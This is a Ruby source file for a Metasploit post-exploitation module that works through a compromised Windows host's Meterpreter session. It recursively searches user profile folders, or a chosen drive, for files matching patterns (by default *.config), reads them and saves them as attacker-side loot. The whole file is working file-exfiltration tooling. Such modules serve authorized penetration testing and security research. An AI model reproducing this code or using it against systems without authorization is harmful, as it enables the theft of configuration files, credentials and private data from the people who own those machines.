##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Windows::FileSystem
  include Msf::Post::Windows::Version
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Gather Generic File Collection',
        'Description' => %q{
          This module downloads files recursively based on the FILE_GLOBS option.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          '3vi1john <Jbabio[at]me.com>',
          'RageLtMan <rageltman[at]sempervictus>'
        ],
        'Platform' => [ 'win' ],
        'SessionTypes' => [ 'meterpreter' ],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_fs_search
              stdapi_railgun_api
              stdapi_sys_config_getenv
            ]
          }
        }
      )
    )

    register_options(
      [
        OptString.new('SEARCH_FROM', [ false, 'Search from a specific location. Ex. C:\\']),
        OptString.new('FILE_GLOBS', [ true, 'The file pattern to search for in a filename', '*.config'])
      ]
    )
  end

  def download_files(location, file_type)
    sysdriv = client.sys.config.getenv('SYSTEMDRIVE')
    profile_path_old = sysdriv + '\\Documents and Settings\\'
    profile_path_new = sysdriv + '\\Users\\'

    version = get_version_info
    if location
      print_status("Searching #{location}")
      getfile = client.fs.file.search(location, file_type, true, -1)

    elsif version.build_number < Msf::WindowsVersion::Vista_SP0
      print_status("Searching #{profile_path_old} through windows user profile structure")
      getfile = client.fs.file.search(profile_path_old, file_type, true, -1)
    else
      # For systems such as: Windows 7|Windows Vista|2008
      print_status("Searching #{profile_path_new} through windows user profile structure")
      getfile = client.fs.file.search(profile_path_new, file_type, true, -1)
    end

    getfile.each do |file|
      filename = "#{file['path']}\\#{file['name']}"
      data = read_file(filename)
      print_status("Downloading #{file['path']}\\#{file['name']}")
      p = store_loot('host.files', 'application/octet-stream', session, data, file['name'], filename)
      print_good("#{file['name']} saved as: #{p}")
    end
  end

  def run
    # When the location is set, make sure we have a valid path format
    location = datastore['SEARCH_FROM']
    if location && location !~ (%r{^([a-z]):[\\|/].*}i)
      print_error("Invalid SEARCH_FROM option: #{location}")
      return
    end

    # When the location option is set, make sure we have a valid drive letter
    my_drive = ::Regexp.last_match(1)
    drives = get_drives
    if location && !drives.include?(my_drive)
      print_error("#{my_drive} drive is not available, please try: #{drives.inspect}")
      return
    end

    datastore['FILE_GLOBS'].split(',').each do |glob|
      download_files(location, glob.strip)
    rescue ::Rex::Post::Meterpreter::RequestError => e
      if e.message =~ /The device is not ready/
        print_error("#{my_drive} drive is not ready")
        next
      elsif e.message =~ /The system cannot find the path specified/
        print_error('Path does not exist')
        next
      else
        raise e
      end
    end

    print_status('Done!')
  end
end
